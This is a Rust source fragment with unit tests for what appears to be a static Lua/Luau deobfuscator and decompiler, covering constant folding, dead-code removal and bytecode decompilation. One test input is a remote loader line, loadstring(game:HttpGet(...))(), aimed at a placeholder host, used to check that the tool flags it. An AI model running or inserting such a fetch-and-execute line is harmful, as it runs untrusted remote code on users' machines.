fn simplify_constant_control_flow(source: &str) -> (String, usize) {
    let tokens = lex_source(source);
    let mut edits = Vec::new();
    let mut i = 0usize;
    while i < tokens.len() {
        if tokens[i].text == "if" {
            if let Some(edit) = simplify_if_at(source, &tokens, i) {
                i += 1;
                edits.push(edit);
                continue;
            }
        }
        if tokens[i].text == "while" {
            if let Some(edit) = simplify_false_while_at(source, &tokens, i) {
                i += 1;
                edits.push(edit);
                continue;
            }
        }
        i += 1;
    }
    apply_edits(source, edits)
}


#[cfg(test)]
mod tests {
    use super::*;

    fn decode_hex(hex: &str) -> Vec<u8> {
        let clean: String = hex.chars().filter(|c| !c.is_whitespace()).collect();
        assert_eq!(clean.len() % 2, 0, "fixture hex must have an even length");
        (0..clean.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&clean[i..i + 2], 16).expect("valid fixture hex"))
            .collect()
    }

    #[test]
    fn strips_comments_but_preserves_newlines() {
        let (out, comments, _, _, issues) = normalize_source("local x = 1 -- comment\n--[=[ block\ncomment ]=]\nprint(x)");
        assert_eq!(comments, 2);
        assert!(out.contains("local x = 1"));
        assert!(out.contains("print(x)"));
        assert!(issues.is_empty());
    }

    #[test]
    fn decodes_safe_string_escapes() {
        let (out, _, count, _, issues) = normalize_source("print('A\\065\\nB')");
        assert_eq!(count, 1);
        assert!(out.contains("print(\"AA\\nB\")"));
        assert!(issues.is_empty());
    }

    #[test]
    fn keeps_invalid_escapes_unchanged() {
        let (out, _, count, _, issues) = normalize_source("local x = '\\q'");
        assert_eq!(count, 0);
        assert!(out.contains("'\\q'"));
        assert!(!issues.is_empty());
    }

    #[test]
    fn decompiles_real_luau_bytecode_fixture() {
        // Real 200-byte compiled Luau chunk from the MIT-licensed
        // PumbaaDev/luau-decompiler test corpus (p03_unary.luac).
        let bytes = decode_hex(include_str!("../tests/fixtures/p03_unary.luac.hex"));
        assert_eq!(bytes.len(), 200);
        assert_eq!(luau_core::bytecode_version(&bytes), Some(6));
        let source = luau_core::decompile(&bytes).expect("fixture should decompile");
        assert!(!source.trim().is_empty());
        assert!(source.contains("function") || source.contains("return") || source.contains("local"));
    }

    #[test]
    fn tovek_backend_decompiles_known_luau_bytecode_fixture() {
        let bytes = decode_hex(include_str!("../tests/fixtures/p03_unary.luac.hex"));
        let (source, key) = try_tovek_decompile(&bytes).expect("Tovek should decompile a known v6 fixture");
        assert_eq!(key, 0);
        assert!(!source.trim().is_empty());
        assert!(source.contains("function") || source.contains("return") || source.contains("local"));
    }

    #[test]
    fn bytecode_response_includes_recovered_source() {
        let bytes = decode_hex(include_str!("../tests/fixtures/p03_unary.luac.hex"));
        let response = inspect_bytecode(&bytes);
        assert!(response.contains("\"ok\":true"));
        assert!(response.contains("\"mode\":\"bytecode\""));
        assert!(response.contains("\"output\":\""));
        assert!(!response.contains("header inspection only"));
    }

    #[test]
    fn malformed_bytecode_is_rejected_without_fake_output() {
        let response = inspect_bytecode(&[0xff; 32]);
        assert!(response.contains("\"output\":\"\""));
        assert!(response.contains("could not be decoded") || response.contains("rejected"));
    }

    #[test]
    fn identifies_lua_bytecode_header_but_does_not_claim_decompilation() {
        let mut bytes = b"\x1bLua".to_vec();
        bytes.extend_from_slice(&[0x51, 0, 1, 4, 4, 4, 8, 0]);
        let response = inspect_bytecode(&bytes);
        assert!(response.contains("Lua-family bytecode"));
        assert!(response.contains("\"output\":\"\""));
    }

    #[test]
    fn folds_constant_arithmetic_and_removes_dead_if_branch() {
        let response = analyze_source(
            "local value = (2 + 3) * 4\nif 1 + 1 == 2 then\n return value\nelse\n return 99\nend\n"
        );
        assert!(response.contains("return 20"), "expected propagated constant in output: {}", response);
        assert!(!response.contains("return 99"), "dead branch must be removed: {}", response);
        assert!(response.contains("\"constant_branches_removed\":1"), "expected branch metric: {}", response);
        assert!(response.contains("\"constant_expressions_folded\":"), "expected fold metrics");
    }

    #[test]
    fn folds_static_string_calls_without_execution() {
        let response = analyze_source(
            "local s = string.char(72, 105); return string.reverse(s)"
        );
        assert!(response.contains("iH"), "static string calls should be recovered: {}", response);
        assert!(response.contains("\"static_calls_folded\":"), "expected static call metric");
    }

    #[test]
    fn removes_provably_false_while_loop() {
        let response = analyze_source("while false do\n return 12345\nend\nreturn 7");
        assert!(!response.contains("return 12345"), "dead loop body remains: {}", response);
        assert!(response.contains("return 7"), "live source should be preserved: {}", response);
    }

    #[test]
    fn folds_nested_bit32_math_and_string_calls_in_multiple_rounds() {
        let response = analyze_source(
            "return string.upper(string.char(bit32.bxor(65, 1), math.floor(66.8)))"
        );
        assert!(response.contains(r#"return \"@B\""#), "nested decoder pipeline was not folded: {}", response);
        assert!(response.contains("\"analysis_rounds\""), "analysis-round metrics are missing");
        assert!(response.contains("\"static_calls_folded\""), "static call metrics are missing");
    }

    #[test]
    fn folds_string_format_and_base_tonumber() {
        let formatted = analyze_source("return string.format(\"%c%c-%02X\", 65, 66, 15)");
        assert!(formatted.contains(r#"return \"AB-0F\""#), "string.format did not fold: {}", formatted);

        let number = analyze_source("return tonumber(\"2A\", 16) + 1");
        assert!(number.contains("return 43"), "tonumber with a base did not fold: {}", number);
    }

    #[test]
    fn folds_utf8_and_ascii_string_helpers() {
        let response = analyze_source("return string.len(string.upper(utf8.char(97, 98, 99)))");
        assert!(response.contains("return 3"), "UTF-8/string helper chain did not fold: {}", response);
    }

    #[test]
    fn folds_bit32_extract_replace_and_rotate() {
        let response = analyze_source(
            "return bit32.extract(bit32.replace(bit32.lrotate(1, 1), 3, 1, 2), 1, 2)"
        );
        assert!(response.contains("return 3"), "bit32 constant operations did not fold: {}", response);
    }

    #[test]
    fn folds_reads_from_immutable_constant_tables() {
        let response = analyze_source(
            "local values = {\"A\", string.char(66)}\nreturn values[1] .. values[1 + 1]"
        );
        assert!(response.contains(r#"return \"AB\""#), "constant table reads were not folded: {}", response);
        assert!(response.contains("\"constant_table_indices_folded\":2"), "table-index metric is missing: {}", response);
    }

    #[test]
    fn does_not_fold_table_reads_after_an_indexed_write() {
        let (output, count) = fold_static_table_indices(
            "local values = {\"A\"}\nvalues[1] = \"B\"\nreturn values[1]"
        );
        assert_eq!(count, 0, "mutated table must not be folded: {}", output);
        assert!(output.contains("values[1]"), "table access should be preserved: {}", output);
    }

    #[test]
    fn loader_input_is_not_returned_as_recovered_source() {
        let response = analyze_source(
            "loadstring(game:HttpGet(\"https://example.invalid/payload\"))()"
        );
        assert!(response.contains("\"format\":\"Lua/Luau dynamic loader\""));
        assert!(response.contains("\"output\":\"\""), "loader should not be shown as recovered source: {}", response);
        assert!(response.contains("payload is not present"));
        assert!(response.contains("\"transformations_total\":0"));
    }

    #[test]
    fn does_not_claim_success_when_no_rewrite_is_supported() {
        let response = analyze_source("return variable_name");
        assert!(response.contains("no supported static transformation was applicable"));
        assert!(response.contains("\"transformations_total\":0"));
    }

    #[test]
    fn keeps_table_keys_and_field_names_during_constant_propagation() {
        let (out, _) = propagate_local_constants("local x = 7\nlocal t = { x = 1 }\nreturn t.x + x");
        assert!(out.contains("{ x = 1 }"), "table key was changed: {}", out);
        assert!(out.contains("t.x"), "field name was changed: {}", out);
        assert!(out.contains("t.x + 7"), "local read was not propagated: {}", out);
    }

}
